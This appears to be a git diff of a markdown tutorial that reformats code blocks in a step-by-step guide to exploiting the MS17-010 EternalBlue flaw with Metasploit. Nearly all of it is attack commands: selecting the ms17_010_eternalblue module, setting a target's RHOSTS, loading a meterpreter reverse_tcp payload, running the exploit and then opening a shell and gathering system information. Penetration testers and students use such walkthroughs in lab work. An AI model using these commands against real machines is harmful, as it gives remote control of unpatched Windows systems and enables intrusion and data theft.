@@ -6,25 +6,35 @@ Ensure you have Metasploit installed on your system. You can use Kali Linux, Par
 ## 2. Start Metasploit Framework
 Open a terminal and launch Metasploit by typing:
 
-```msfconsole```
+```bash
+msfconsole
+```
 
 Once inside Metasploit, you can search for the EternalBlue module using:
 
-```show module```
+```bash
+show module
+```
 
 ## 3. Search for the MS17-010 EternalBlue Exploit Module
 To search for a specific module:
 
-```search ms17-010```
+```bash
+search ms17-010
+```
 
 ## 4. Select the Exploit Module
 After finding the appropriate exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue), select it by entering:
 
-`use exploit/windows/smb/ms17_010_eternalblue`
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+```
 
 ## 5. Set Required Parameters
 
-```Set RHOSTS <Target IP>```
+```bash
+Set RHOSTS <Target IP>
+```
 
 Review other options that might need configuration using the `show options` command and set them accordingly. Common options include `LHOST`, `RPORT`, etc.
 -----------------------------------------------------------------------------
@@ -39,12 +49,16 @@ Review other options that might need configuration using the `show options` comm
 After selecting the exploit module, you need to set the payload that will be delivered to the compromised system. This payload determines the action or code executed on the target after exploitation.
 For example, to set the payload as a reverse shell for a Windows target:
 
-```set payload windows/meterpreter/reverse_tcp```
+```bash
+set payload windows/meterpreter/reverse_tcp
+```
 
 ## 7. Execute the Exploit
 Once all necessary options are set, run the exploit by typing:
 
-```exploit```
+```bash
+exploit
+```
 
 The exploit might take some time to run. Upon successful exploitation, Metasploit may display the meterpreter prompt, indicating a successful compromise of the target system.
 
@@ -54,7 +68,11 @@ Once the exploit succeeds and you gain access to the compromised system, you can
 
 ### Some useful post-exploitation commands:
 
-- **System Commands**: Execute system commands on the target system using : ```shell```
+- **System Commands**: Execute system commands on the target system using :
+  
+```bash
+shell
+```
   
 Gather System Information: Retrieve system information like system details, user information, etc. using commands such as `sysinfo`, `getuid`, etc.
 
